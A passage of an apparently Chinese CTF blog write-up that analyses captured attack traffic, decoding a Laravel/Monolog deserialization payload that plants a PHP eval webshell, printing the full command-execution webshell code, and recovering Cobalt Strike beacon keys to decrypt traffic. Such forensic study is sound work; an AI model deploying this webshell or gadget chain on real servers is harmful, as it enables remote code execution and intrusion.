D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure>
+<p>把payload中的=00替换为空然后解base64可以得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">	�a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~ضtest.txt\KKa~ضtesttest6z&#x3D;Jc�F��ؐ݌&amp;~�&lt;@��GBMB</span><br></pre></td></tr></table></figure>
+<p>这写进去的应该是一个序列化对象，应该是和laravel的rce有关，我们重点关注传进去的内容。@eval(@gzinflate(base64_decode($_POST[14433])));所以需要做gzip和base64的解码才可以明白流量包中的具体内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span class="line">_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4F</span><br><span class="line">b430b310838a93&#x3D;4g</span><br><span class="line">f861d394170244&#x3D;X4Y21k</span><br><span class="line">ufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm</span><br></pre></td></tr></table></figure>
+<p>上面是对解压包的url解码，然后gzip+base64解码尝试还原代码内容,对上面的每个参数进行解密!下面这个包是解压缩的包的解码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">	$ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">	$oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir);</span><br><span class="line">	@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">	foreach($oparr as $item) &#123;</span><br><span class="line">		if(!@is_writable($item)) &#123;</span><br><span class="line">			continue;</span><br><span class="line">		&#125;</span><br><span class="line">		;</span><br><span class="line">		$tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;;</span><br><span class="line">		@mkdir($tmdir);</span><br><span class="line">		if(!@file_exists($tmdir)) &#123;</span><br><span class="line">			continue;</span><br><span class="line">		&#125;</span><br><span class="line">		@chdir($tmdir);</span><br><span class="line">		@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">		$cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;,$tmdir);</span><br><span class="line">		for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class="line">			@chdir(&quot;..&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		;</span><br><span class="line">		@ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;);</span><br><span class="line">		@rmdir($tmdir);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">	return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">	$output&#x3D;ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	echo &quot;36&quot;.&quot;4f2&quot;;</span><br><span class="line">	echo @asenc($output);</span><br><span class="line">	echo &quot;42&quot;.&quot;ff1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">	$p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2));</span><br><span class="line">	$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br><span class="line">	$envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2));</span><br><span class="line">	$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">	$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">	if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">		@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if(!empty($envstr)) &#123;</span><br><span class="line">		$envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class="line">		foreach($envarr as $v) &#123;</span><br><span class="line">			if (!empty($v)) &#123;</span><br><span class="line">				@putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">	function fe($f) &#123;</span><br><span class="line">		$d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">		if(empty($d)) &#123;</span><br><span class="line">			$d&#x3D;array();</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			$d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));</span><br><span class="line">		&#125;</span><br><span class="line">		return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	function runshellshock($d, $c) &#123;</span><br><span class="line">		if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123;</span><br><span class="line">			if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123;</span><br><span class="line">				$tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;);</span><br><span class="line">				putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">				if (fe(&#39;error_log&#39;)) &#123;</span><br><span class="line">					error_log(&quot;a&quot;, 1);</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				return False;</span><br><span class="line">			&#125;</span><br><span class="line">			$output &#x3D; @file_get_contents($tmp);</span><br><span class="line">			@unlink($tmp);</span><br><span class="line">			if ($output !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">				print($output);</span><br><span class="line">				return True;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return False;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	function runcmd($c) &#123;</span><br><span class="line">		$ret&#x3D;0;</span><br><span class="line">		$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">		if(fe(&#39;system&#39;)) &#123;</span><br><span class="line">			@system($c,$ret);</span><br><span class="line">		&#125; elseif(fe(&#39;passthru&#39;)) &#123;</span><br><span class="line">			@passthru($c,$ret);</span><br><span class="line">		&#125; elseif(fe(&#39;shell_exec&#39;)) &#123;</span><br><span class="line">			print(@shell_exec($c));</span><br><span class="line">		&#125; elseif(fe(&#39;exec&#39;)) &#123;</span><br><span class="line">			@exec($c,$o,$ret);</span><br><span class="line">			print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">		&#125; elseif(fe(&#39;popen&#39;)) &#123;</span><br><span class="line">			$fp&#x3D;@popen($c,&#39;r&#39;);</span><br><span class="line">			while(!@feof($fp)) &#123;</span><br><span class="line">				print(@fgets($fp,2048));</span><br><span class="line">			&#125;</span><br><span class="line">			@pclose($fp);</span><br><span class="line">		&#125; elseif(fe(&#39;proc_open&#39;)) &#123;</span><br><span class="line">			$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io);</span><br><span class="line">			while(!@feof($io[1])) &#123;</span><br><span class="line">				print(@fgets($io[1],2048));</span><br><span class="line">			&#125;</span><br><span class="line">			while(!@feof($io[2])) &#123;</span><br><span class="line">				print(@fgets($io[2],2048));</span><br><span class="line">			&#125;</span><br><span class="line">			@fclose($io[1]);</span><br><span class="line">			@fclose($io[2]);</span><br><span class="line">			@proc_close($p);</span><br><span class="line">		&#125; elseif(fe(&#39;antsystem&#39;)) &#123;</span><br><span class="line">			@antsystem($c);</span><br><span class="line">		&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">			return $ret;</span><br><span class="line">		&#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">			$w&#x3D;new COM(&#39;WScript.shell&#39;);</span><br><span class="line">			$e&#x3D;$w-&gt;exec($c);</span><br><span class="line">			$so&#x3D;$e-&gt;StdOut();</span><br><span class="line">			$ret.&#x3D;$so-&gt;ReadAll();</span><br><span class="line">			$se&#x3D;$e-&gt;StdErr();</span><br><span class="line">			$ret.&#x3D;$se-&gt;ReadAll();</span><br><span class="line">			print($ret);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			$ret &#x3D; 127;</span><br><span class="line">		&#125;</span><br><span class="line">		return $ret;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	$ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">	print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">	echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+<p>可以看到，参数s接收执行命令的参数    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br></pre></td></tr></table></figure>
+<p>所以s=</p>
+<figure class="highlight plain"><figcaption><span>/d "D:\\phpstudy_pro\\WWW\\secret"&"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以得到压缩密码为P4Uk6qkh6Gvqwg3y。下面就可以解压beacon keys.下面需要做的工作为：获得私钥，通过私钥获得AES密钥以查看与teamserver的通信内容。需要用到的工具在<br><a target="_blank" rel="noopener" href="https://github.com/WBGlIl/CS_Decrypt">https://github.com/WBGlIl/CS_Decrypt</a></p>
+<p>首先是根据私钥文件恢复RSA KEY。<img src="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim" alt="paste image">根据RSA KEY 恢复AES KEY，需要看beacon通信的数据包，根据cs特性，一般这个值藏在cookie里。<img src="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim" alt="paste image"><img src="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim" alt="paste image">拿到AES KEY之后，继续利用脚本还原beacon返回的内容，这里抓取的是submit.php的特征。根据CobaltStrike的通信规则，beacon会向teamserver POST submit.php?id=xxx，POSTDATA为AES加密后的内容。将加密后的内容复制出来之后解密<img src="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim" alt="paste image"><br>注意需要是base64格式的，然后使用脚本进行解密<img src="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim" alt="paste image">解密后得到flag。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这题太折磨人了，做了好久才做出来，写wp又写了一段时间。顺便学了下CS的简单通信过程，收获还是有的。<br>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43264813/article/details/120560209">https://blog.csdn.net/qq_43264813/article/details/120560209</a><br><a target="_blank" rel="noopener" href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan</a><br><a target="_blank" rel="noopener" href="https://www.wkr.moe/ctf/610.html#toc-head-3">https://www.wkr.moe/ctf/610.html#toc-head-3</a></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <p style="width: 100%;
+  word-wrap: break-word;
+  word-break: break-all;
+  overflow: hidden;">hhttps://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</p>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/polosec" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="http://cdn.polowong.top/1.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/polosec" target="_blank"><span class="text-dark">Polo</span><small class="ml-1x">CTFer&amp;Cybersec Researcher</small></a></h3>
+        <div>Wong</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="uyan_frame"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2021/09/24/Analysis-of-flask-memory-webshell/" title="Analysis of flask memory webshell"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>Maybe you could buy me a cup of coffee.</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/vx.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/polosec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/polosec" target="_blank"> polosec </a>base on <a href="https://github.com/polosec/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+    <script defer type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=[object Object]"></script>
+
+
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
